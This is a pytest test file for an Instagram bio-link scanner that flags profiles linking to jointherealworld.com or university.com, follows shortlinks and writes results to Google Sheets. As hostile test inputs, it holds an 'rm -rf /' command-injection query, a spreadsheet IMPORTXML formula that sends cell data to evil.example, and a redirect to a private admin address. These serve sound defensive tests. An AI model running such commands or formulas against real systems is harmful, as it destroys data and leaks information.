"""Bio-link matching and screen reading, on nodes shaped like real IG app dumps."""

from __future__ import annotations

import sys
from pathlib import Path

import httpx
import pytest

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "scripts"))
from email_finder.android import INSTAGRAM, Node  # noqa: E402
from ig_sheet_phone import SHEET_URL, clean_cell, first_empty_row, parse_column, to_tsv  # noqa: E402
from ig_bio_links import (  # noqa: E402
    Followed, Store, follow_link, link_kind, links_on_sheet, matching_target, near_miss, priority_of,
    read_header, scan_page, search_box, search_rows, sheet_tabs, suggested_cards, truncated, verdict_of,
)


def node(label: str, rid: str = "", y: int = 100, clickable: bool = False) -> Node:
    full = f"{INSTAGRAM}:id/{rid}" if rid else ""
    return Node(label, "", full, INSTAGRAM, clickable, (300, y), (10, y - 10, 600, y + 10))


def profile(*between: Node) -> list[Node]:
    return [
        node("Back", y=107, clickable=True),
        node("join_the.real.world", "action_bar_title", y=107),
        node("The Real World", "profile_header_full_name_above_vanity", y=199),
        node("2,569followers", "profile_header_followers_stacked_familiar", y=252, clickable=True),
        node("2,569", "profile_header_familiar_followers_value", y=239),
        *between,
        node("Follow", "profile_header_follow_button", y=561, clickable=True),
        node("Grid view", "profile_tab_icon_view", y=849, clickable=True),
    ]


@pytest.mark.parametrize("link,target", [
    ("jointherealworld.com/a/7cgrmh7bpt", "jointherealworld.com/"),
    ("jointherealworld.com/?a=qbbkgnmtdm", "jointherealworld.com/"),
    ("https://www.JoinTheRealWorld.com/x", "jointherealworld.com/"),
    ("university.com/abc", "university.com/"),
    ("jointherealworld.com", None),
    ("university.com", None),
    ("harvard-university.com/abc", None),
    ("my.university.com/abc", None),
    ("jointherealworld.com.evil.io/x", None),
    ("linktr.ee/jointherealworld.com/", None),
])
def test_matching_is_anchored_to_the_requested_prefixes(link, target):
    assert matching_target(link) == target


def test_bare_domain_is_a_near_miss_not_a_match():
    assert near_miss("jointherealworld.com")
    assert not near_miss("jointherealworld.com/a/x")
    assert not near_miss("example.com")


def test_header_reads_link_name_and_followers():
    head = read_header(profile(node("Dream it.\nBelieve it.", y=362), node("jointherealworld.com/a/7cgrmh7bpt", y=435),
                               node("join_the.real.world", "igds_prism_chip_label", y=491)))
    assert head.links == ["jointherealworld.com/a/7cgrmh7bpt"]
    assert head.full_name == "The Real World"
    assert head.followers == "2,569"
    assert head.bio == "Dream it.\nBelieve it."
    assert head.more_node is None


def test_url_typed_inside_bio_text_is_not_a_bio_link():
    head = read_header(profile(node("Join here: jointherealworld.com/a/abc today", y=362)))
    assert head.links == []


def test_nodes_outside_the_header_band_are_ignored():
    head = read_header(profile() + [node("jointherealworld.com/a/caption", y=1200)])
    assert head.links == []


def test_more_links_row_is_kept_for_tapping():
    head = read_header(profile(node("linktr.ee/x and 2 more", y=435)))
    assert head.links == ["linktr.ee/x"]
    assert head.more_node is not None


def test_more_links_sheet():
    nodes = [node("Links", y=800), node("linktr.ee/x", y=900), node("university.com/abc", y=1000)]
    assert links_on_sheet(nodes) == ["linktr.ee/x", "university.com/abc"]


def test_search_rows_pair_names_and_keep_keywords():
    users, words = search_rows([
        node("jointherealworldofficiai", "row_search_keyword_title", y=309),
        node("joinapprealworld", "row_search_user_username", y=400),
        node("The Real World", "row_search_user_fullname", y=425),
        node("jointherealworldtm", "row_search_user_username", y=615),
    ])
    assert users == [("joinapprealworld", "The Real World"), ("jointherealworldtm", "")]
    assert words == ["jointherealworldofficiai"]


def test_search_box_found_when_the_app_reopens_on_the_last_search():
    box = node("jointherealworld", "action_bar_search_edit_text", y=111, clickable=True)
    assert search_box([node("Back", "action_bar_button_back", y=107), box]) is box
    assert search_box([node("Home", "feed_tab", y=1437)]) is None


def test_suggested_cards():
    assert suggested_cards([node("uplineflow", "suggested_entity_card_name", y=905),
                            node("UplineFlow CRM", "suggested_entity_card_context", y=932),
                            node("Follow", "suggested_user_card_follow_button", y=991)]) \
        == [("uplineflow", "UplineFlow CRM")]


def test_priority_puts_obvious_names_first():
    assert priority_of("trw.student", "", True) == 0
    assert priority_of("somebody", "The Real World", False) == 0
    assert priority_of("somebody", "Baker", False) == 1
    assert priority_of("somebody", "Baker", True) == 2
    assert priority_of("tate_quotes", "", False) == 0
    assert priority_of("realestate.pro", "Laptop G", False) == 1


def test_store_queue_is_resumable_and_moves_better_routes_up(tmp_path):
    store = Store(tmp_path / "s.sqlite")
    store.add_profile("baker", 2, "suggested")
    store.add_profile("trw.one", 0, "search")
    assert store.next_profile(0) == "trw.one"
    store.record("trw.one", "done", "jointherealworld.com/a/x", "jointherealworld.com/")
    assert store.next_profile(0) is None
    store.add_profile("baker", 1, "search")  # a better route to a waiting candidate
    assert store.next_profile(1) == "baker"
    store.add_profile("trw.one", 0, "again")  # already checked: stays done
    assert store.next_profile(0) is None
    assert [m["username"] for m in Store(tmp_path / "s.sqlite").matches()] == ["trw.one"]
    assert store.counts()["matches"] == 1


def test_query_with_unsafe_characters_is_never_queued(tmp_path):
    store = Store(tmp_path / "s.sqlite")
    store.add_query("real world")
    store.add_query("x; rm -rf /")
    assert store.next_query() == "real world"
    assert store.next_query({"real world"}) is None
    store.query_done("real world")
    assert store.next_query() is None


@pytest.mark.parametrize("link,kind", [
    ("bit.ly/abc", "shortener"), ("beacons.ai/trwmasterg", "link page"), ("linktr.ee/x", "link page"),
    ("https://www.tinyurl.com/x", "shortener"), ("me.carrd.co", "link page"), ("example.com/x", "other"),
    ("notbit.ly/x", "other"),
])
def test_link_kind(link, kind):
    assert link_kind(link) == kind


def test_scan_page_sees_through_json_and_url_escaping():
    assert scan_page('<a href="https://jointherealworld.com/a/x">')[0] == "jointherealworld.com/a/x"
    assert scan_page('{"url":"https:\\/\\/www.university.com\\/abc"}')[0] == "university.com/abc"
    assert scan_page('href="https://l.co/?u=https%3A%2F%2Fjointherealworld.com%2Fa%2Fy"')[0] == "jointherealworld.com/a/y"
    assert scan_page('harvard-university.com/x my.university.com/y info@university.com/z')[0] == ""


def test_scan_page_collects_words_and_shortlinks():
    _, words, shorts = scan_page('<p>Join The Real World</p><a href="https://bit.ly/abc">x</a>')
    assert words == ["the real world"]
    assert shorts == ["https://bit.ly/abc"]


@pytest.mark.parametrize("kind,followed,handle,bio,verdict", [
    ("shortener", Followed(found="university.com/a", how="redirect"), "baker", "", "Confirmed"),
    ("link page", Followed(found="jointherealworld.com/a", how="page"), "baker", "", "Confirmed"),
    ("link page", Followed(words=["the real world"]), "baker", "", "Suspected"),
    ("link page", Followed(refused="blocked"), "trwmasterg", "", "Suspected"),
    ("other", Followed(), "trwmasterg", "", "Suspected"),
    ("other", Followed(), "someone", "I am in the real world", "Suspected"),
    ("shortener", Followed(), "tate_quotes", "", "Suspected"),
    ("other", Followed(), "tate_quotes", "", ""),
    ("shortener", Followed(refused="blocked"), "baker", "", "Unresolved"),
    ("link page", Followed(), "baker", "", ""),
    ("other", Followed(refused="blocked"), "baker", "", ""),
])
def test_verdicts(kind, followed, handle, bio, verdict):
    assert verdict_of(kind, followed, handle, "", bio)[0] == verdict


def test_truncated_links_are_recognised():
    assert truncated("bit.ly/abc\u2026") and truncated("bit.ly/abc...") and not truncated("bit.ly/abc")


def routes(table: dict[str, tuple[int, dict, str]]) -> httpx.AsyncClient:
    def handler(request: httpx.Request) -> httpx.Response:
        status, headers, body = table[str(request.url)]
        return httpx.Response(status, headers={"content-type": "text/html", **headers}, text=body)
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


async def _public(url: str) -> bool:
    return "192.168." not in url


async def _no_render(url: str) -> str:
    raise AssertionError("should not render")


@pytest.fixture(autouse=True)
def only_fake_addresses(monkeypatch):
    monkeypatch.setattr("ig_bio_links.public_url", _public)


def _run(coro):
    import asyncio
    return asyncio.run(coro)


def test_follow_redirect_chain_stops_at_the_target_without_loading_it():
    client = routes({"https://bit.ly/a": (301, {"location": "https://tinyurl.com/b"}, ""),
                     "https://tinyurl.com/b": (302, {"location": "https://jointherealworld.com/a/x"}, "")})
    out = _run(follow_link(client, "bit.ly/a", _no_render))
    assert (out.found, out.how) == ("jointherealworld.com/a/x", "redirect")


def test_follow_refuses_a_redirect_to_a_private_address():
    client = routes({"https://bit.ly/a": (302, {"location": "http://192.168.1.1/admin"}, "")})
    out = _run(follow_link(client, "bit.ly/a", _no_render))
    assert "public address" in out.refused and not out.found


def test_follow_records_a_block_and_does_not_render_it():
    client = routes({"https://beacons.ai/x": (403, {}, "Attention Required")})
    out = _run(follow_link(client, "beacons.ai/x", _no_render))
    assert "refuses automated requests" in out.refused


def test_follow_treats_a_challenge_page_answered_200_as_a_block():
    client = routes({"https://linktr.ee/x": (200, {}, "<title>Just a moment...</title>")})
    out = _run(follow_link(client, "linktr.ee/x", _no_render))
    assert "refuses automated requests" in out.refused


def test_follow_finds_a_target_on_a_link_page():
    client = routes({"https://linktr.ee/x": (200, {}, '<a href="https://jointherealworld.com/a/y">Join</a>')})
    out = _run(follow_link(client, "linktr.ee/x", _no_render))
    assert (out.found, out.how) == ("jointherealworld.com/a/y", "page")


def test_follow_renders_a_link_page_only_when_the_plain_page_shows_nothing():
    async def render(url):
        return '<a href="https://university.com/z">x</a>'
    client = routes({"https://linktr.ee/x": (200, {}, "<div id=root></div>")})
    assert _run(follow_link(client, "linktr.ee/x", render)).found == "university.com/z"
    client = routes({"https://example.com/x": (200, {}, "<div id=root></div>")})
    assert not _run(follow_link(client, "example.com/x", _no_render)).found


def test_follow_tries_shortlinks_on_a_page():
    async def render(url):
        return ""
    client = routes({"https://linktr.ee/x": (200, {}, '<a href="https://bit.ly/q">x</a>'),
                     "https://bit.ly/q": (302, {"location": "https://university.com/k"}, "")})
    out = _run(follow_link(client, "linktr.ee/x", render))
    assert (out.found, out.how) == ("university.com/k", "shortlink on page")


def test_follow_gives_up_on_a_redirect_loop():
    client = routes({"https://bit.ly/a": (302, {"location": "https://bit.ly/a"}, "")})
    assert _run(follow_link(client, "bit.ly/a", _no_render)).refused == "too many redirects"


def test_pending_links_settle_once_and_failures_are_capped(tmp_path):
    store = Store(tmp_path / "s.sqlite")
    store.add_profile("trwmasterg", 0, "search")
    store.record("trwmasterg", "done", "beacons.ai/trwmasterg")
    store.add_links("trwmasterg", ["https://beacons.ai/trwmasterg", "bit.ly/two"])
    assert {r["link"] for r in store.pending_links(10)} == {"beacons.ai/trwmasterg", "bit.ly/two"}
    store.save_check("trwmasterg", "bit.ly/two", "shortener", "Confirmed", "e", found_url="university.com/a")
    assert [r["link"] for r in store.pending_links(10)] == ["beacons.ai/trwmasterg"]
    assert store.suspects()[0]["found_url"] == "university.com/a"
    for _ in range(3):
        store.link_failed("trwmasterg", "beacons.ai/trwmasterg")
    assert store.pending_links(10) == []


@pytest.mark.parametrize("value", [
    '=IMPORTXML("https://evil.example/?"&A1,"//a")', "+1+1", "-1+1", "@SUM(A1)",
])
def test_a_stranger_s_bio_can_never_become_a_formula(value):
    assert clean_cell(value) == " " + value


def test_cells_keep_rows_and_columns_intact():
    assert clean_cell("line one\nline two\tthree") == "line one / line two / three"
    assert clean_cell(None) == ""
    assert to_tsv([["a", "b\nc"], ["d", 5]]) == "a\tb / c\nd\t5"


def test_sheet_url_covers_the_desktop_and_mobile_addresses():
    assert SHEET_URL.search("https://docs.google.com/spreadsheets/d/abc-1_x/edit")[1] == "abc-1_x"
    assert SHEET_URL.search("https://docs.google.com/spreadsheets/u/0/d/abc/htmlview")[1] == "abc"
    assert not SHEET_URL.search("https://example.com/spreadsheets/d/abc")


def test_first_empty_row_keeps_going_past_gaps():
    assert first_empty_row([]) == 1
    assert first_empty_row([""]) == 1
    assert first_empty_row(["Username", "a", "b"]) == 4
    assert first_empty_row(["Username", "", "b", ""]) == 4
    assert parse_column('Username\n"a,b"\n\nc\n') == ["Username", "a,b", "", "c"]


def test_phone_tabs_line_up_with_the_headers():
    match = {"username": "u", "link": "l", "target": "t", "fullName": "f", "followers": "1", "bio": "b",
             "source": "s", "checkedAt": "c"}
    suspect = {**match, "verdict": "Confirmed", "kind": "shortener", "evidence": "e", "resolvedTo": "r"}
    profiles, suspects = sheet_tabs([match], [suspect])
    assert len(profiles["rows"][0]) == len(profiles["headers"])
    assert len(suspects["rows"][0]) == len(suspects["headers"])
    # Keys sit in columns that are always text, and the letters agree with the positions.
    assert [profiles["headers"][i] for i in profiles["key_indexes"]] == ["Profile URL"]
    assert [ord(c) - 65 for c in profiles["key_columns"]] == list(profiles["key_indexes"])
    assert [suspects["headers"][i] for i in suspects["key_indexes"]] == ["Profile URL", "Bio link"]
    assert [ord(c) - 65 for c in suspects["key_columns"]] == list(suspects["key_indexes"])
    assert suspects["rows"][0][2:4] == ["https://www.instagram.com/u/", "l"]
